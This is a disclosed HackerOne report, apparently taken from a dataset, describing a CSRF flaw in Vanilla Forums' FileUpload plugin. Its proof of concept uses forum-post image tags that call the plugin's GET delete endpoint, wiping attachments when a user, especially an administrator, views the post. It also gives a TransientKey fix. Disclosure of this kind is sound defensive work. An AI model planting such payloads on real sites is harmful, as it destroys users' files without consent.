---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '367966'
original_report_id: '367966'
title: 'FileUpload Plugin: CSRF (delete all attached files)'
weakness: Cross-Site Request Forgery (CSRF)
team_handle: vanilla
created_at: '2018-06-18T08:46:01.666Z'
disclosed_at: '2019-04-06T11:19:07.200Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 24
asset_identifier: '*.vanillaforums.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# FileUpload Plugin: CSRF (delete all attached files)

## Metadata

- HackerOne Report ID: 367966
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: vanilla
- Disclosed At: 2019-04-06T11:19:07.200Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Description
------------

The current version (1.9.1) of the official [FileUpload](https://github.com/vanilla/addons/tree/master/plugins/FileUpload) plugin is vulnerable to CSRF. A successful attack allows the removal of files the attacked user has the permission to delete. Administrators for example have the permission to delete all attached files.

As the request to delete files is GET based, and as users can post image tags, an attacker does not need to get a user to visit an attacker-controlled website. Instead, it is enough if a user views the post of a user.

POC
---

Create a new post or comment with the following content (where `localhost` represents the domain which hosts vanilla):

	<img src="http://localhost/vanilla-core-2-6/plugin/fileupload/delete/1?DeliveryType=VIEW&DeliveryMethod=JSON" alt="test">
	<img src="http://localhost/vanilla-core-2-6/plugin/fileupload/delete/2?DeliveryType=VIEW&DeliveryMethod=JSON" alt="test">
	<img src="http://localhost/vanilla-core-2-6/plugin/fileupload/delete/3?DeliveryType=VIEW&DeliveryMethod=JSON" alt="test">
	[...]
	<img src="http://localhost/vanilla-core-2-6/plugin/fileupload/delete/999?DeliveryType=VIEW&DeliveryMethod=JSON" alt="test">

Once a user views the post, the file(s) with the specified id will be deleted. The attack can target files 1 to n - where n is the most recent id - , and will successfully delete all files if an administrator views the post.

Solution
--------

The same TransientKey mechanism that protects other requests against CSRF can be used.

## Impact

Deletion of all images

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
